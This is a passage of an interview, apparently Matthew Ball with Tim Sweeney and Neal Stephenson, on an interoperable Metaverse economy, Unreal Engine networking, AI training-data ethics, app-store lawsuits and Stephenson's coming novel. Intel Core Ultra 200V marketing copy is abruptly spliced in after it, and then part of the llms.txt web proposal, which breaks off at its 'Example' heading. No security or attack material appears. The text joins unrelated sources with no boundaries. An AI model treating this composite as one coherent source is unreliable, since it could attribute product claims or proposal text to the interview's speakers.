Item Shop’s revenue, which is a source of spending, with experiences, which are the source of engagement, and build an economy that scales based on that. And from the very beginning, the idea was that we're operating a <em>Fortnite</em> version of this initially, but in the long run, there's no reason that this Creator Economy 2.0 couldn't be extended into a Creator Economy 3.0 where any company could participate however they choose.</p><p>And besides participating in technical standards, if another ecosystem with similar or compatible visual aesthetic and respect for games ratings and so on wanted to participate, then perhaps we could connect our economies where if you spend in the <em>Fortnite</em> Item Shop and then play in a third-party economy, then we revenue share to them. And if a third-party item shop sells something and then it's used in <em>Fortnite</em>, they revenue share to us. And just as internet hosts agree on peering arrangements to connect their fiber optic lines, that revenue sharing can enable an open Metaverse economic model. And I think this is one of the exciting things that we'll see happen within this decade. And Epic has been on a very long-term trajectory to build out all of this tech and to do it in a thoroughly open way. </p><p>We have Unreal Engine, which is a huge engine, but we expect the ultimate Metaverse technical standards will be engine agnostic and that you could participate in the open Metaverse in the game that's built using the Unity engine or the Godot permissively licensed open source engine.</p><p>And while you're doing that, you could use any number of online backends. You could use the Epic Online Services social backend for voice chat or you could use Sony's PSN or Microsoft's Xbox Live or Valve's with Steamworks. And that perhaps if these companies would actually cooperate in the right ways, then we could build an entire economy that links all the major games and all of the platforms together into an economy. I think it's actually in everybody's best interest. This isn't like the smartphone walled gardens. What's happening in the Metaverse is Metcalfe’s Law at a huge scale. Players want to be in a place where they can play with their friends. If we can connect our voice chat systems and our economies and players can move seamlessly together with their party and with their purchases where they're compatible, move from say, <em>Fortnite</em> to <em>Roblox</em> to <em>Grand Theft Auto</em> to <em>PUBG Mobile</em>, and then to a pure chat type of application as well, then the world would be a better place.</p><p>But not only that, but the companies participating would actually make more money because we'd see an engagement lift from the ability to reach more customers through this interconnected economy. And all of our competitors would gain more revenue too because of the increased opportunity they have to actually reach customers and players would play more and they would spend more, because buying an outfit in this future open Metaverse could be owning it everywhere they went and not just in the one <em>Roblox</em> experience or one <em>Fortnite</em> ecosystem that they're participating in as is currently the case. I really think that this is going to happen. And it doesn't rely on any altruism for those participants, but it's in everybody's interest and that this world of the open Metaverse will just be purely better than the separate game worlds that we have today.</p><p><strong>Stephenson: </strong>You don't want to have to stop at the exit of every Metaverse experience and take all your clothes off and then step across the threshold into a different experience and then put on the clothes that you're allowed to wear in that experience. You want to just walk through. And that seems so obvious that people just assume that's the case. It seems like you shouldn't even have to mention that, but it takes a lot of technology to actually make that work.</p><p><strong>Ball: The seventh anniversary of <em>Fortnite</em> comes up next month. Seven years from now, how do you think of <em>Fortnite</em> as being different? I think in the typical fan's perspective, <em>Fortnite</em> right now is Battle Royale, which they see primarily as a game. They see the Metaverse play primarily around UEFN. And the interaction model for UEFN feels a little bit like an app store or Netflix or YouTube. You've got thumbnails and rows and rows of them, and that's how you navigate these different 3D worlds that are lightly connected through avatars and aesthetics and user identities. What do you think the platform looks like another seven years from now? What's your dream experience?</strong></p><p><strong>Sweeney: </strong>It's going to evolve a lot. And when you look at what's in <em>Fortnite</em> today, some of it you have to recognize as artifacts of the limitations of the current technology that we're working within. Why is <em>Fortnite: Battle Royale</em> 100 players? Well, because at the time we launched it we couldn't make 200 players work on a server. Computers in the data center were just too slow. The reason we have <em>Fortnite</em> divided into a huge number of different islands, many built by third-party creators and some built by Epic, is because we don't yet have the entire technology stack needed to robustly enable every creator to put their content together into a big, seamless open world if they wanted. And so a lot of the things you see in there are not the permanent end state of what we see this medium being, but are just current crutches that we're using to hobble by as we work towards the ultimate capabilities of the thing.</p><p>And so I think we need to expect really significant changes in a number of areas. One is being able to build an interoperable economy that works with other games and other ecosystems is a key that will be really freeing for people, being all of the systems for voice chat and account interoperable, federated so that you can participate with any of the major platform company services rather than each <em>Fortnite</em> using ours and every other game using their own is going to be a key part of it. Another is the networking model, which is extremely limited. If you look at what's in Unreal Engine 5 today, it's remarkably similar to the networking model I built for Unreal Engine 1 in 1997. It shipped in <em>Unreal</em> and <em>Unreal Tournament</em>, and it's been incrementally improved ever since without dramatically upending it.</p><p>But the problem with this network model is it doesn't enable our servers to talk to each other. A <em>Fortnite</em> Battle Royale session is 100 players. There might be at peak hundreds of thousands of these servers running and there might be at peak over 10 million concurrent players online all at once, but they're each in their own separate sharded copies of the world and they can't see each other in that space. They can't go anywhere to find each other all at once. </p><p>So one of the big efforts that we're making for Unreal Engine 6 is improving the networking model, where we both have servers supporting lots of players, but also the ability to seamlessly move players between servers and to enable all the servers in a data center or in multiple data centers, to talk to each other and coordinate a simulation of the scale of millions or in the future, perhaps even a billion concurrent players. That's got to be one of the goals of the technology. Otherwise, many genres of games just can never exist because the technology isn't there to support them. And further, we've seen massively multiplayer online games that have built parts of this kind of server technology. They've done it by imposing enormous costs on every programmer who writes code for the system. As a programmer you would write your code twice, one version for doing the thing locally when the player's on your server and another for negotiating across the network when the player's on another server. Every interaction in the game devolves into this complicated networking protocol every programmer has to make work. And when they have any bugs, you see item duplication bugs and cheating and all kinds of exploits. Our aim is to build a networking model that retains the really simple Verse programming model that we have in <em>Fortnite</em> today using technology that was made practical in the early 2000's by Simon Marlow, Simon Peyton Jones and others called <a href="https://en.wikipedia.org/wiki/Software_transactional_memory">Software Transactional Memory</a>.</p><p>The idea is that you write normal code and it's our job as the implementors of the engine and the language runtime to make your code scale, so the game can run on a vast number of servers and to do all of the necessary coordination and to provide the guidelines. If you optimize your code in a certain way like you optimize for cache coherency today, then we want your game to be able to run in a much larger simulation than we're running now. This is one of our focuses for Unreal Engine 6, and it's going to consume an increasing portion of our engine team's efforts as we work on this. And the other is the ability to combine as much of the content together into a seamless world as players want. Some experiences will be better by themselves. If you want to build an awesome bespoke story-driven, single player or a co-op game, you might build it off in its own little corner of the world, no connections to the outside, but an awful lot of what we're doing would be a whole lot better if it were all seamlessly connected. </p><p>As Disneyland is itself, you get on all of these elaborate transport systems like the People Mover and the different cars go from place to place. You can go anywhere in this connected world and participate in any experience there. And what are creators doing instead of creating their own little isolated islands? They're taking over a portion of space in the world and they're defining the game roles there in different parts of space. </p><p>We've done little experiments here and there along the way. Back in <em>Fortnite</em> Chapter 2 [Note: This eight-season chapter began in October 2019 and ended December 2021], there was a period where there was a bubble appearing around certain parts of the world. It changed the gameplay in that part. Imagine that writ large in the scale of a simulation with hundreds of millions of players and hundreds of thousands of creators. </p><p>The final bit is interoperability of content and code. Battle Royale is mostly code written by Epic. Every creator's world is a mashup of their code and Epic's code. But things become really interesting when every creator's code can interoperate with every creator's code.</p><p>Everybody's out creating their own really interesting objects and creating them using protocols that are provided by the system to enable them all to work together. So you might be riding a mount or an animal built by one creator and your friend might be driving a car built by another creator. You might be carrying a weapon built by a third creator, and you might be in a world maintained by dozens of other creators, and you might be moving seamlessly from place to place with all of these interactions happening. And you really expect that to work. An awful lot of the reasons that we've built Verse and our ecosystem the way we have is to allow for these future usage cases.</p><p>If you just wanted to get <em>Roblox</em> style experience with a bunch of sharded islands deployed as quickly as possible, there were much faster ways we could have done that and much simpler trade-offs we could have made in the language and in the engine to achieve that. But we're building for the long term, and by the end of this decade I think an awful lot of this will have come to fruition and you'll see the ability of creators of all sorts to build things that are qualitatively different and better than they are today.</p><p><strong>Ball: Neal, we talked a little bit about Lamina1, and you have a novel coming out later this year that I want to get to, but you're also an advisor to Inworld.AI and a co-founder at Whenere. What are those latter two companies about?</strong></p><p><strong>Stephenson:</strong> Yeah, so this has to do with what would I want to experience in the Metaverse. - where is the first place I would go. My co-founder at Whenere is <a href="https://www.linkedin.com/in/karen-laur-7521501/" target="_blank">Karen Laur,</a> who was employee number 17 at Valve. She worked on Half-Life 1, and we ended up working together at Magic Leap building creative projects there. And towards the end of that time, we were messing around quite a bit with Sequencer, which was a component of Unreal Engine that is there to help people who want to make cinematic experiences. And through that, we got to know Kim Libreri and some of the team at the Northern California branch of Epic who were working on making Unreal Engine a tool for people who work in film and TV, not just games. And so what came out of all of that is this realization that graphics hardware and game engines have reached the point where you can now build immersive environments that most people would identify as of cinematic quality. If you're a professional movie director, you might see that it's not quite up to that level, but most people are essentially going to consider it a photorealistic environment. So that was kind of the first element of this.</p><p>And then what came on a little bit later was Inworld.AI, and they're building a system that essentially makes it easy to connect large language models on the back end to avatars in the game engine. In effect, you can use a simple interface to essentially build the brain of a character. You can specify what this character knows, what they don't know, and what their personality traits are. You can map them onto a voice from a different company. The one we are using at the moment is called ElevenLabs. And then you can wire that in to an avatar in the game engine. We're using Unreal, we're using MetaHuman, which is another kind of cinematic feature that's been added to the engine in the last few years, which basically makes it easier for people to create, again, nearly photorealistic human avatars. So what it all adds up to is that to game in Whenere, all you have to do is talk.</p><p>We have a speech-to-text subsystem in there that will transmit whatever you said to the character's brain in the backend. The brain will generate an appropriate response based on the knowledge base and the personality of that character, and send it back to the game engine as an utterance, which is it's text, it's the sound file generated by ElevenLabs, and it's a set of visemes, so the atoms of facial animation. So that the character will exhibit the right facial expressions and even the right emotional expressions that have been generated by the brain.</p><p>And we first encountered this when we were working with an internal production team at Inworld to make a character <a href="https://nealstephenson.substack.com/p/virj">Virj</a>, who was part of the extended <em>Snow Crash</em> universe timeline. And we went in sort of with modest expectations and were just astounded by how well this thing worked and how interesting the results could be. And so I think zooming out for a second, the door that this opened for us is that the way that we interact with video game worlds has tended to be pretty limited, and most games still revolve around shooting things because that is a perfect match for the UI input devices that we've got. You use a mouse to put the crosshair where you want it, you click the button to fire the weapon or whatever, and you see something happen in the world, the world responds in a way that makes sense, and that's been a very powerful UI paradigm. But here for the first time, we were able to just sit and talk like normal people to this character and have an answer back.</p><p>So based on that, we, Karen and I and Jamil Moledina co-founded Whenere last summer and we've been working since then on building a system that sits on top of Unreal Engine and on top of Inworld.AI, and its purpose is to enable users to immerse themselves in story worlds that they love. You go to Comic-Con, you go to any kind of fan environment, you see people who've traveled thousands of miles, they've spent thousands of dollars to make elaborate cosplay outfits, and it's all in the service of I love Game of Thrones or Harry Potter or Lord of the Rings or whatever, so much that I just want to spend more time in it. And we think that there's a way now to give those fans the ability to enter into such worlds, and not only to interact with them, but to mod those worlds, to come up with new ideas, new fan fiction storylines, or just to change the way the furniture's arranged or the way a character looks or talks.</p><p>So we've been working away on that since about August and have been fairly quiet up to now, but we're going to be talking about it more in the coming weeks.</p>

  <p><strong>Ball: Both of you create technology and you're also content creators. I'm interested in your perspective on AI training data and ethics. </strong></p><p><strong>Sweeney</strong>: I think that outside of universities doing research, companies shouldn't train AI on data where they don't have clear and explicit permission from the creator of the data to do that. That was granted in a way that made either ownership or the right to train clear. If a company buys ownership of the data from the creator of the data or gets permission to use it for training AI, it’s fair game. And they shouldn’t train AI on that data if they don’t have that permission. And I think we have to treat research institutions differently when they're actually doing research because there's much more compelling public interest in advancing that research. I think it's rather unfortunate that like cryptocurrency, AI has been taken over by the Wild West with companies doing things that are rather astonishing and put them at odds with all the world's creators and an awful lot of the users as well.</p><p>I think that's unfortunate because AI is a really important technology that is going to change the world. I think that after this first generation of rather wild practices fades away, we're going to see companies with a lot much more responsible data usage practices coming to the forefront and use of AI in a way that's much more well-thought-out and specialized to particular usage cases. I still think that the idea of creating a chatbot that's supposed to have all the world's knowledge and be an agent of good is a very long way from coming to fruition. And the folly of all the current efforts, both being lamed down to the point where they aren't as useful as they ought to be, but also doing things that are egregiously wrong, like telling you to eat rocks. It's kind of an artifact of this technology being adopted way too widely, way too quickly.</p><p>But I think all of this stuff would've been awesome if it were the work of researchers for another decade or so before it were treated as a serious mainstream technology. And if instead of being a commercial product that's being licensed to enterprise customers around the world, if ChatGPT were, like, some university's chatbot, with this massive disclaimer of this chatbot might make stuff up and say ridiculous things at times and it's just no big deal, don't treat it too seriously. But unfortunately, everybody in their race to have their first mover advantage has gone away from the standards that govern most forms of technology development, and that's leading to regulatory backlash and all sorts of other problems, and that's very unfortunate. But I think as optimists for the future of technology, we shouldn't let that early misadventure with AI dissuade us from the long-term value of the technology. And so I'd encourage the same sort of patience I encourage with blockchain and cryptographic technology in the field of AI.</p><p><strong>Stephenson: </strong>I was just going to say that I think a lot of this has to do with the intent or the perceived intent of the people who are building these systems. They've shown kind of a remarkable propensity for shooting themselves in the foot by making statements that are very threatening to creators. And it's strange to me that they would focus on famous actresses or artists as we're going to replace you. It's a really odd series of PR gaffes.</p><p>I'll say that as Tim says, this is going to develop more texture and complexity over time for Whenere, we wanted to avoid getting into issues around ownership of IP. And so we're starting with older books that are in the public domain. We've hired a researcher. The woman who's creating the brains of our characters is an accomplished researcher who's using open source public domain material to come up with the background information, what these characters know, what they understand, how they talk, and that's all kind of kept track of and footnoted so that we know where our training material originates from.</p><p><strong>Ball: Tim, another major gaming publisher's CEO recently said that within three years, he expects that GenAI will allow them to be 30% more efficient, expand their player network by 50% using personalization, culturalization and increased immersion, and 10 to 20% increases in ARPU. Others are more focused on creating new game genres or experiences using AI. How do you think about this tool set over the, say, longer time horizon when some of the ethics and legality and permissions are clarified, but where do you think the big opportunity is for game makers?</strong></p><p><strong>Sweeney: </strong>I think generative AI will lead to dramatic productivity gains because of the ease of creation of objects that will meet your specific needs. If you want a bunch of cool trees, you can go into the Quixel library and get a tree off the shelf from us for free for Unreal Engine use. But if you want a specific tree that meets a specific need for a specific scene in your game, you can have a modeler build it right now, and that takes an enormous amount of time and expense. In the future you're going to be able to create a mashup by giving some high-level instructions as to exactly what kind of tree you create. And based on training data that was properly owned or licensed, it will make the tree you want. I see dramatic productivity gains coming to a lot of areas of game development.</p><p>Also, I think that this will increase opportunities for all creators and increase employment opportunities in the industry as a whole, as have all other technological improvements that have come. We're going to take all the people we have and perhaps some more and build even bigger, better games using the technology. And so the technology is going to enable us to improve the scope and quality of our products and build bigger and better games. And so that will certainly come and it will come at different rates. You have to remember, the reason that we had a massive revolution in generative AI and text AI beginning last year was because of the 30 years of research that had gone into the foundations of how to train and manage those sorts of AIs.</p><p>And particularly if you read some of the papers on this technology-powered stable diffusion image generation AI, they're solving a long complicated series of differential equations at the absolute leading edge of applied mathematics because they've spent the past 20 to 30 years figuring out how to do that. This AI isn't going to come to all fields with equal speed. 3D object generation AI isn't going to be revolutionized next year. It's probably going to take many years because a lot of the things that were done for 2D have not yet been done for 3D, nor does anybody know how to do them. And so there's a huge amount of research and development effort needed to unblock AI contributing to specific fields in specific new ways and creating game content at the level of quality that you expect.</p><p>But I think this will be empowering and economically expanding and opportunity expanding for everybody in the industry. And it's very hard to predict the impact on game industry revenue or other metrics like that. But this is definitely going to bring us the capability of building better, bigger, and more compelling games faster. And because this technology will be ubiquitously available to everybody, we should expect the state of gaming to improve dramatically as a result of it. I think we should expect the entirety of the gaming economy to improve as well. Better games means players will be spending more. Better games means that companies get more returns by investing more in building games. And so you'll probably see increases in employment and you'll probably see a lifting of all ships and also an upending of a lot of things.</p><p>In the early days, Epic artists drew pixels. Nowadays, Epic artists mostly model 3D objects. And the things that people do with their mouse clicks in the future will be different things than the things they do with their mouse clicks today. But I think the value of creators will not be undermined by AI in the long run because all of these companies are competing with each other. We need a lot of humans to make a lot of awesome creative decisions about how these games are to work.</p>

  <p><strong>Ball: Neal, have you tried the Vision Pro?</strong></p><p><strong>Stephenson</strong>: No. No, I haven't.</p><p><strong>Ball: Have you tried it, Tim?</strong></p><p><strong>Sweeney: </strong>I have not.</p><p><strong>Ball: Why not?</strong></p><p><strong>Stephenson:</strong> I simply haven't had the opportunity. I literally don't know how I would go about getting access to one, other than buying one and having it shipped to me, which I wouldn't be interested in doing. My drawer is full. The drawer where I put expensive goggles that I never use.</p><p><strong>Sweeney: </strong>We're doing a lot here and I have to prioritize. That's just me personally; the Unreal Engine team is supporting Vision Pro wholeheartedly.</p><p><strong>Ball: Tim, why were your Apple and Google lawsuits so critical to constructing the Metaverse?</strong></p><p><strong>Sweeney: </strong>The Metaverse needs to evolve into a system that's way cooler and more powerful than the web. You're going to need the best capabilities of 3D engines, the best capabilities of economies, commerce and interoperability. You're going to need the best creation tools and the best creator deployment tools. And ultimately, what creators will be doing in building the Metaverse is not building a bunch of separate apps to go through Apple's approval process, but they're going to be contributing to a huge world that will evolve under extraordinarily complex rules. And it is vitally important that we not allow the gatekeepers, Apple and Google, to block progress on the Metaverse as they block progress on the web and block progress in computing in general. And the ways they do that are numerous, and they're also rather insidious. We take a lot of their past decisions for granted and don't realize how much they're undermining the quality and capabilities of the devices that we own and the capabilities that the devices we own could have if they weren't being so horrid.</p><p>For example, Apple blocks web browser choice. By blocking competing web browser engines, they block web browsers from introducing new 3D standards from optimizing performance and from creating capabilities for web apps to have the power and performance and capabilities of native apps. You're not allowed to do any of these things on the web because Apple doesn’t want web apps to compete with native apps, since they collect 30% taxes on native apps and 0% on web apps.</p><p>We should also expect the Metaverse to be an economically complex and expensive business to operate in which many creators are fully investing most of their profits or most of their revenue back into creating awesome content, with ecosystem companies, payment processors, and everybody competing with each other to offer the best value. And operating the <em>Fortnite</em> creator economy, we know that this is a very expensive thing to operate. It's not just like a game store like the Epic Games Store which sells other companies’ games. There's a massive amount of back-end services that have to be run including cloud service and hosting, content moderation and ecosystem safety costs. We're having humans intervene to make sure that what players are doing or what creators are doing are safe for everybody. There's a massive, massive set of costs.</p><p>And if you let Apple and Google set the ground rules for the Metaverse, that tax they collect at the front end is going to constitute the far, far majority of profit that will ever be made from the Metaverse. And it would just go into their stock buybacks rather than those profits going to creators to reinvest in creating content, building better stuff, and engines and payment processors and other contributors to the overall Metaverse ecosystem. It would just be collected in junk fees and dividend it out to shareholders for doing absolutely nothing, which is what Apple and Google really do for the Metaverse. Nothing at all.</p><p>And I guess equally importantly, they've placed themselves in a position of gatekeeping and saying the apps aren't allowed to do certain things. If you look at the Department of Justice's complaint against Apple, they're preventing broad categories of apps from even existing. If a US developer wanted to offer the same variety of services in the US that WeChat does in China, Apple would simply say no. They don't let you bundle together a useful app with a distribution vehicle for other companies’ apps. They don't let you advertise other companies’ apps or promote other companies’ apps. They don't allow you to run vast facets of an app economy that you'd normally have because they simply say, you cannot do this thing. There's all of that. And I don't think that the Metaverse can even exist on these mobile devices so long as they have those sorts of rules.</p><p>By imposing huge sets of rules on what their competitors are allowed to do on devices customers have bought, they can prevent entire categories of software from existing and they will prevent the Metaverse from existing to the extent that they can't fully tax it. And if it is allowed to exist in the future, then it will exist as a vassal to Apple's fiefdom.</p><p>And that's why it's so important that we win all of these fights and that world regulators and law enforcers stop these monopolies from using their control of the operating systems on these devices and over a trillion dollar digitally connected economy, which is exactly what they're doing now. Regulators are taking notice. The European Union, Japan, and UK have now passed really robust laws that will stop this, and the US is too captured by Apple at the moment to pass laws, but progress may be made and the fight continues worldwide.</p><p><strong>Ball: I have two final, more fun questions. The first time the three of us played <em>Fortnite</em>, Neal, you were Silver Surfer, Tim, you were an anthropomorphic jellyfish. Why those outfits? Neal, I'll start with you.</strong></p><p><strong>Stephenson: </strong>A Silver Surfer is just a vintage comic book character who was sort of a cult favorite. Not one of the big name comic book characters, but had a cult following. And he was sort of brooding and kind of always going on about philosophical stuff. And there was a brief moment in the 90s when somebody wanted to make an update of Silver Surfer called Cyber Surfer, and my phone rang and that project went nowhere. I never really did anything or got paid. But so just when I saw Silver Surfer come up on as a skin you could get, I just clicked on it.</p>

  <p><strong>Ball: And Tim, the jellyfish?</strong></p><p><strong>Sweeney: </strong>I was on Twitter and telling a story about one of my <em>Fortnite</em> games and somebody replied saying like, "Gee, you're CEO of Epic. When you beat somebody in <em>Fortnite</em>, don't you feel bad about that? This is one of your customers, and you just caused them to lose a Battle Royale game." That made me feel bad. But when I switched to a giant jellyfish that's like a foot taller than all the other characters with giant colorful tentacles sticking out of his head, the one character in <em>Fortnite</em>, that doesn't blend into any environment we've ever had, I feel better about that. And so playing as a giant jellyfish, it's bright purple and pink, makes me feel okay about playing a Battle Royale game and perhaps defeating other people because they have plenty of notice that I'm coming.</p><p><strong>Stephenson: </strong>Oh, is it generally known that that's your outfit?</p><p><strong>Sweeney: </strong>Yeah. And basically everybody who has a jellyfish profile picture, I follow them on Twitter because we Jellies have to stick together.</p><p><strong>Ball: Speaking of things we can see a long time coming, when the Metaverse does arrive to the extent in which that's ever a definable thing, do you think we'll use the term? And if not, what will it be?</strong></p><p><strong>Sweeney: </strong>I hope so. If we use one company's word for it, if we call it <em>Fortnite</em>, then we've kind of failed to build the open version of it. So I would hope that it would actually be called the Metaverse and not some company's brand like Googling when you're searching the internet. So I hope so.</p><p><strong>Stephenson: </strong>We've kind of hit this topic previously earlier in the conversation. Matt, you were talking about is the Metaverse Dead? We see postmortems for the Metaverse. And yet on the other hand, <em>Fortnite</em> and <em>Roblox</em> and other such platforms have got vast numbers of people using them. We just don't generally refer to them as the Metaverse, but people who kind of understand the concept know that that's what they are. So I think it'll be something like that.</p><p>But it's always been the case that the new technologies have a sort of currency in the language that eventually comes to seem sort of dated. So in the 30s, radio was this amazing kind of newish thing to a lot of people. And so you can still buy a little red wagons called Radio Flyer. It's just a wagon, it has nothing to do with radio, but 100 years ago, somebody thought it would be cool to put the word radio on the wagon because it had connotations of this is the thing of the future. And we see that with internet and with a whole lot of tech buzzwords that come and go over time.</p><p><strong>Ball: Finally, Neal, it has 32 years since <em>Snow Crash</em>. We're now just a few months from your next book, which comes out October 15. What can you tell us about?</strong></p><p><strong>Neal: </strong>Yeah. It's going back to writing historical novels about science, which is something I enjoyed a lot when I wrote <em>Cryptonomicon</em> and then the <em>Baroque Cycle</em>. And so in this case, it's the beginning of a series about science, the development of physics in the 1930s and the 1940s, eventually leading up to the bomb. And in that world, there's a lot of amazing stories that for some reason haven't been told. And so I just found it to be a really exciting part of history when I started to kind of learn about it. And so each volume is going to center on a different specific character, but they all kind of know each other and they interact.</p>

  <p>So for <em>Polostan</em>, the character is a young woman who's got an American mother and a Russian father, and lives on the cultural boundary line between those two worlds during the Great Depression. She's a big fan of Bonnie and Clyde. She's a really interesting character, I think. So, yeah, that's coming out in mid-October. I'll be doing a book tour, be passing through Cary, North Carolina. So, but purchase your advanced copy now at a bookseller near you.</p><p><strong>Ball: I haven’t had a chance to read it yet, but eagerly looking forward!

                                        <p><strong>Why It Matters: </strong>Today’s consumers are increasingly creating, connecting, playing and learning on the go. They need a system that offers exceptional performance, long-lasting battery life, no-compromise application compatibility and enhanced security – and one that can take advantage of AI hardware thanks to broad software enablement.</p>

<p>Intel Core Ultra 200V series processors were designed with all of that in mind, delivering low-power leadership for AI PCs with up to 50% lower package power<sup>1 </sup>and up to 120 total platform TOPS (tera operations per second) across central processing unit (CPU), graphic processing unit (GPU) and neural processing unit (NPU) to deliver the most compatible and performant AI experiences across models and engines. The fourth-generation NPU is up to 4x more powerful than the previous generation and is ideal for running sustained AI workloads while remaining energy-efficient. Industry-leading platform TOPS are activated in more than 300 AI-accelerated features enabled by Intel’s work with over 100 integrated software vendors (ISVs) and developers as part of its <a href="https://www.intel.com/content/www/us/en/products/docs/processors/core-ultra/ai-pc-acceleration.html">AI PC Acceleration Program</a>.</p>

<p>The new processors deliver efficient and exceptional core performance through fine-tuned power management, completely rearchitected Performance-cores (P-core) optimized for performance per power per area. And Intel’s most powerful Efficient-cores (E-cores) to date are now able to contain more workloads, ensuring cool and quiet performance.</p>

<p>Intel Core Ultra 200V series processors mark the debut of Intel’s new X<sup>e</sup>2 graphics microarchitecture that delivers a significant leap in mobile graphics performance with 30% average performance uplift<sup>2</sup>.

<h2 data-anchor-id="background">Background</h2>
<p>Today websites are not just used to provide information to people, but they are also used to provide information to large language models. For instance, language models are often used to enhance development environments used by coders, with many systems including an option to ingest information about programming libraries and APIs from website documentation.</p>
<p>Providing information for language models is a little different to providing information for humans, although there is plenty of overlap. Language models generally like to have information in a more concise form. This can be more similar to what a human expert would want to read. Language models can ingest a lot of information quickly, so it can be helpful to have a single place where all of the key information can be collated.</p>
</section>
<section id="proposal">
<h2 data-anchor-id="proposal">Proposal</h2>
<div>
<figure>
<p><a href="https://llmstxt.org/logo.png" data-gallery="quarto-lightbox-gallery-1" title="llms.txt logo"><img src="https://llmstxt.org/logo.png" width="150" alt="llms.txt logo"></a></p>

</div>
<p>We propose that those interested in providing LLM-friendly content add a <code>/llms.txt</code> file to their site. This is a markdown file that provides brief background information and guidance, along with links to markdown files (which can also link to external sites) providing more detailed information. This can be used, for instance, in order to provide information necessary for coders to use a library, or as part of research to learn about a person or organization and so forth. You are free to use the <code>llms.txt</code> logo on your site to indicate your support if you wish.</p>
<p>llms.txt markdown is human and LLM readable, but is also in a precise format allowing fixed processing methods (i.e.&nbsp;classical programming techniques such as parsers and regex). For instance, there is an <a href="https://llmstxt.org/intro.html">llms-txt</a> project providing a CLI and Python module for parsing <code>llms.txt</code> files and generating LLM context from them. There is also a <a href="https://llmstxt.org/llmstxt-js.html">sample JavaScript</a> implementation.</p>
<p>We furthermore propose that pages on websites that have information that might be useful for LLMs to read provide a clean markdown version of those pages at the same URL as the original page, but with <code>.md</code> appended. (URLs without file names should append <code>index.html.md</code> instead.)</p>
<p>The <a href="https://fastht.ml/">FastHTML project</a> follows these two proposals for its documentation. For instance, here is the <a href="https://docs.fastht.ml/llms.txt">FastHTML docs llms.txt</a>. And here is an example of a <a href="https://docs.fastht.ml/tutorials/by_example.html">regular HTML docs page</a>, along with exact same URL but with <a href="https://docs.fastht.ml/tutorials/by_example.html.md">a .md extension</a>. Note that all <a href="https://nbdev.fast.ai/">nbdev</a> projects now create .md versions of all pages by default, and all Answer.AI and fast.ai software projects using nbdev have had their docs regenerated with this feature—for instance, see the <a href="https://fastcore.fast.ai/docments.html.md">markdown version</a> of <a href="https://fastcore.fast.ai/docments.html">fastcore’s docments module</a>.</p>
<p>This proposal does not include any particular recommendation for how to process the file, since it will depend on the application. For example, FastHTML automatically builds a new version of two markdown files including the contents of the linked URLs, using an XML-based structure suitable for use in LLMs such as Claude. The two files are: <a href="https://docs.fastht.ml/llms-ctx.txt">llms-ctx.txt</a>, which does not include the optional URLs, and <a href="https://docs.fastht.ml/llms-ctx-full.txt">llms-ctx-full.txt</a>, which does include them. They are created using the <a href="https://llmstxt.org/intro.html#cli"><code>llms_txt2ctx</code></a> command line application, and the FastHTML documentation includes information for users about how to use them.</p>
<p>llms.txt files can be used in various scenarios. For software libraries, they can provide a structured overview of documentation, making it easier for LLMs to locate specific features or usage examples. In corporate websites, they can outline organizational structure and key information sources. Information about new legislation and necessary background and context could be curated in an <code>llms.txt</code> file to help stakeholders understand it.</p>
<p>llms.txt files can be adapted for various domains. Personal portfolio or CV websites could use them to help answer questions about an individual. In e-commerce, they could outline product categories and policies. Educational institutions might use them to summarize course offerings and resources.</p>
</section>
<section id="format">
<h2 data-anchor-id="format">Format</h2>
<p>At the moment the most widely and easily understood format for language models is Markdown. Simply showing where key Markdown files can be found is a great first step. Providing some basic structure helps a language model to find where the information it needs can come from.</p>
<p>The <code>llms.txt</code> file is unusual in that it uses Markdown to structure the information rather than a classic structured format such as XML. The reason for this is that we expect many of these files to be read by language models and agents. Having said that, the information in <code>llms.txt</code> follows a specific format and can be read using standard programmatic-based tools.</p>
<p>The <code>llms.txt</code> file spec is for files located in the root path <code>/llms.txt</code> of a website (or, optionally, in a subpath). A file following the spec contains the following sections as markdown, in the specific order:</p>
<ul>
<li>An H1 with the name of the project or site. This is the only required section</li>
<li>A blockquote with a short summary of the project, containing key information necessary for understanding the rest of the file</li>
<li>Zero or more markdown sections (e.g.&nbsp;paragraphs, lists, etc) of any type except headings, containing more detailed information about the project and how to interpret the provided files</li>
<li>Zero or more markdown sections delimited by H2 headers, containing “file lists” of URLs where further detail is available
<ul>
<li>Each “file list” is a markdown list, containing a required markdown hyperlink <code>[name](url)</code>, then optionally a <code>:</code> and notes about the file.</li>
</ul></li>
</ul>
<p>Here is a mock example:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span># Title</span></span>
<span id="cb1-2"></span>
<span id="cb1-3"><span>&gt; Optional description goes here</span></span>
<span id="cb1-4"></span>
<span id="cb1-5">Optional details go here</span>
<span id="cb1-6"></span>
<span id="cb1-7"><span>## Section name</span></span>
<span id="cb1-8"></span>
<span id="cb1-9"><span>- </span><span>[</span><span>Link title</span><span>](https://link_url)</span>: Optional link details</span>
<span id="cb1-10"></span>
<span id="cb1-11"><span>## Optional</span></span>
<span id="cb1-12"></span>
<span id="cb1-13"><span>- </span><span>[</span><span>Link title</span><span>](https://link_url)</span></span></code></pre></div>
<p>Note that the “Optional” section has a special meaning—if it’s included, the URLs provided there can be skipped if a shorter context is needed. Use it for secondary information which can often be skipped.</p>
</section>
<section id="existing-standards">
<h2 data-anchor-id="existing-standards">Existing standards</h2>
<p>llms.txt is designed to coexist with current web standards. While sitemaps list all pages for search engines, <code>llms.txt</code> offers a curated overview for LLMs. It can complement robots.txt by providing context for allowed content. The file can also reference structured data markup used on the site, helping LLMs understand how to interpret this information in context.</p>
<p>The approach of standardising on a path for the file follows the approach of <code>/robots.txt</code> and <code>/sitemap.xml</code>. robots.txt and <code>llms.txt</code> have different purposes—robots.txt is generally used to let automated tools what access to a site is considered acceptable, such as for search indexing bots. On the other hand, <code>llms.txt</code> information will often be used on demand when a user explicitly requesting information about a topic, such as when including a coding library’s documentation in a project, or when asking a chat bot with search functiontionality for information. Our expectation is that <code>llms.txt</code> will mainly be useful for <em>inference</em>, i.e.&nbsp;at the time a user is seeking assistance, as opposed to for <em>training</em>. However, perhaps if <code>llms.txt</code> usage becomes widespread, future training runs could take advantage of the information in <code>llms.txt</code> files too.</p>
<p>sitemap.xml is a list of all the indexable human-readable information available on a site. This isn’t a substitute for <code>llms.txt</code> since it:</p>
<ul>
<li>Often won’t have the LLM-readable versions of pages listed</li>
<li>Doesn’t include URLs to external sites, even although they might be helpful to understand the information</li>
<li>Will generally cover documents that in aggregate will be too large to fit in an LLM context window, and will include a lot of information that isn’t necessary to understand the site.</li>
</ul>
</section>
<section id="example">
<h2 data-anchor-id="example">Example</h2>
